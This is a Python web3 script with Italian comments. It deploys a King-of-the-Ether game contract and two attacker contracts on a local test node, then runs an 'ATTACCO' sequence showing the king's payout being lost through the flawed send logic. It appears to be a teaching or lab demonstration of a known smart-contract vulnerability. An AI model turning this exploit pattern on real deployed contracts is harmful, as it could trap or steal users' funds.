from web3 import Web3
import json

web3 = Web3(Web3.HTTPProvider('http://node:8545'))
if (web3.isConnected()):
    print("Connessione con il nodo riuscita" + "\n")
else:
    print("Connessione con il nodo fallita" + "\n")

kotetInterface = [
	{
		"constant": False,
		"inputs": [
			{
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "sweepCommission",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "claimPrice",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "king",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
kotetInterfaceJS = json.dumps(kotetInterface) 

aliceInterface = [
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "king",
				"type": "address"
			},
			{
				"name": "w",
				"type": "uint256"
			}
		],
		"name": "unseatKing",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
aliceInterfaceJS = json.dumps(aliceInterface) 

bobInterface = [
	{
		"constant": True,
		"inputs": [],
		"name": "count",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "king",
				"type": "address"
			},
			{
				"name": "w",
				"type": "uint256"
			}
		],
		"name": "unseatKing",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
bobInterfaceJS = json.dumps(bobInterface) 

kotetBytecode = "6060604052606460015533600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550670de0b6b3a764000034101561009f57600080fd5b61028c806100ae6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630eb3f5a01461011d57806315d655c914610140578063cc181ca814610169575b60008060015434101561006957600080fd5b6100716101be565b91506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f193505050509050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101136101cb565b6001819055505050005b341561012857600080fd5b61013e60048080359060200190919050506101d6565b005b341561014b57600080fd5b610153610235565b6040518082815260200191505060405180910390f35b341561017457600080fd5b61017c61023b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000606460015401905090565b600060c83401905090565b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f1935050505090505050565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a7230582044097cc587b10b8378aa628efba259998b3dd20ac3497e22fa762c8a5851d45f0029"
aliceBytecode = "6060604052341561000f57600080fd5b61012a8061001e6000396000f3006060604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe014604b57806339341dde146071575b005b3415605557600080fd5b605b60a6565b6040518082815260200191505060405180910390f35b60a4600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505060c5565b005b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60008273ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f19250505090505050505600a165627a7a72305820b9e49140f283475851b7713d63208189f57d5f7e5de662636cb5572b449af0160029"
bobBytecode = "6060604052341561000f57600080fd5b61017d8061001e6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306661abd1461006a57806312065fe01461009357806339341dde146100bc575b6000808154809291906001019190505550005b341561007557600080fd5b61007d6100f3565b6040518082815260200191505060405180910390f35b341561009e57600080fd5b6100a66100f9565b6040518082815260200191505060405180910390f35b6100f1600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610118565b005b60005481565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60008273ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f19250505090505050505600a165627a7a72305820bd267b65df33b5c1b05d4e42460270f06a99143f7310e0175af0a8ca5dac42520029"

accounts = web3.eth.accounts
# Set dell'account con il quale farò i deploy
web3.eth.defaultAccount = web3.eth.accounts[0]

# Definisco un oggetto contratto kotet a partire dall'interfaccia e dal bytecode
kotetContract = web3.eth.contract(abi=kotetInterfaceJS, bytecode=kotetBytecode)
# Costruisco la transazione per fare il deploy del contratto kotet
contract_data = kotetContract.constructor().buildTransaction({'value': 1000000000000000000})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_kotet = web3.eth.contract(address=txn_receipt.contractAddress, abi=kotetInterfaceJS)

# Definisco un oggetto contratto alice a partire dall'interfaccia e dal bytecode
aliceContract = web3.eth.contract(abi=aliceInterfaceJS, bytecode=aliceBytecode)
# Costruisco la transazione per fare il deploy del contratto alice
contract_data = aliceContract.constructor().buildTransaction()
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_alice = web3.eth.contract(address=txn_receipt.contractAddress, abi=aliceInterfaceJS)

# Definisco un oggetto contratto bob a partire dall'interfaccia e dal bytecode
bobContract = web3.eth.contract(abi=bobInterfaceJS, bytecode=bobBytecode)
# Costruisco la transazione per fare il deploy del contratto bob
contract_data = bobContract.constructor().buildTransaction()
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_bob = web3.eth.contract(address=txn_receipt.contractAddress, abi=bobInterfaceJS)

print("======================================================================")

# Funzioni del contratto kotet
print("Funzioni offerte dal contratto kotet:\n" + str(contract_kotet.all_functions()) + "\n")

# Stampa del re
print("Re del contratto kotet (perché ne ha fatto il deploy):\n" + str(contract_kotet.functions.king().call()) + "\n")

# Stampa del re
print("Re del contratto kotet (perché ne ha fatto il deploy):\n" + str(contract_kotet.functions.king().call()) + "\n")

# Stampa del prezzo da pagare per diventare re
x = contract_kotet.functions.claimPrice().call()
print("Il prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")

print("============================ATTACCO==========================================")

# Bob richiama la funzione unseatKing con 100 wei per far diventare il contratto maligno il nuovo re
contract_bob.functions.unseatKing(contract_kotet.address, x).transact({'value': x})

# Stampa del nuovo re
print("Re del contratto kotet (è Bob):\n" + str(contract_kotet.functions.king().call()) + "\n")

# Stampa del prezzo da pagare per diventare re aggiornato
x = contract_kotet.functions.claimPrice().call()
print("Il nuovo prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")

# Adesso Alice riesce a diventare re ma Bob non prende la ricompensa, che viene trattenuta da Kotet 
# Ho dovuto alzare il gas limit !!
contract_alice.functions.unseatKing(contract_kotet.address, x).transact({'value': x, 'gasLimit': 3000000})

# Stampa del nuovo re
print("Re del contratto kotet (è Alice):\n" + str(contract_kotet.functions.king().call()) + "\n")

# Bilancio del contratto kotet
print("Bilancio del contratto kotet:\n" + str(web3.eth.getBalance(contract_kotet.address)) + "\n")

# Bilancio del contratto bob
print("Bilancio del contratto Bob:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")